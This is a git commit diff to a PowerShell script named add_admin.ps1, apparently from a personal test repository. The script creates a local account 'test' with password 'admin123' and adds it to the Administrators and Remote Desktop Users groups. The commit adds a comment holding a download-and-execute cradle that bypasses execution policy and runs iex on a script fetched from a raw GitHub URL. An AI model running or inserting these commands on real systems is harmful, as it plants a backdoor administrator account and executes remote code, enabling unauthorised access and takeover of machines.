492ff7150896483cb88c197edec1bfd85926ee86
Prabhsimran <pswalia2u@gmail.com>
2024-12-17 15:10:08 +0000

    Update add_admin.ps1

--- add_admin.ps1
+++ add_admin.ps1
@@ -1,3 +1,4 @@
+# powershell.exe -nop -exec bypass -c iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pswalia2u/test/refs/heads/main/add_admin.ps1'))
 net user /add test admin123
 net localgroup "Administrators" test /add
 net localgroup "Remote Desktop Users" test /add 
